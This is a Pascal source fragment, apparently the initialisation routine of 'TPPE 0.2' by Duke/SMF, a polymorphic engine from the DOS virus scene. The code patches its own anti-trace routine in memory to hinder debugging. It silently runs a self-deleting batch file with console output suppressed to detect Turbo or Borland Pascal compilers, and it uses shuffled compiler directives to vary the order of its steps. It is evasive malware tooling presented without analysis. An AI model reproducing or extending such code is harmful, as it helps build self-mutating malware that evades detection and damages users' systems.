procedure TPPE_Init;
type pbyte = ^byte;
var Gn:searchrec;
    b:text;
    i:integer;
    p:pointer;
procedure Check;
begin
assign(b,'tppe.bat');rewrite(b);
writeln(b,'@ctty nul');
writeln(b,Compile,'>1.txt');
close(b);
exec(Command,'/c tppe.bat>nul');
{$IFOPT D+}erase(b);{$ENDIF}
findfirst('1.txt',$20,Gn);
{$IFOPT D-}erase(b);{$ENDIF}
end;
begin
p:=@AntiTrace;
for i:=1 to 9 do inc(pbyte(longint(p)+i)^);
{$IFOPT I+}Command:=GetEnv('COMSPEC');{$ENDIF}
{$IFOPT T-}DetectComp:=false;{$ENDIF}
{$IFOPT I-}Command:=GetEnv('COMSPEC');{$ENDIF}
Compile:='tpc.exe';
{$IFOPT T+}DetectComp:=false;{$ENDIF}
Check;
{$IFOPT S+}Randomize;{$ENDIF}
if doserror=0 then DetectComp:=true else
  begin
  {$IFOPT P-}Compile:='[TPPE 0.2] (c) by Duke/SMF';{$ENDIF}
  Compile:='bpc.exe';
  Check;
  if doserror=0 then DetectComp:=true;
  end;
{$IFOPT D+}AntiTrace;{$ENDIF}
{$IFOPT N-}TPPE_1;{$ENDIF}
if DetectComp then
  begin
  assign(b,Gn.name);
  erase(b);
  end;
{$IFOPT S-}Randomize;{$ENDIF}
{$IFOPT D-}AntiTrace;{$ENDIF}
{$IFOPT N+}TPPE_1;{$ENDIF}
end;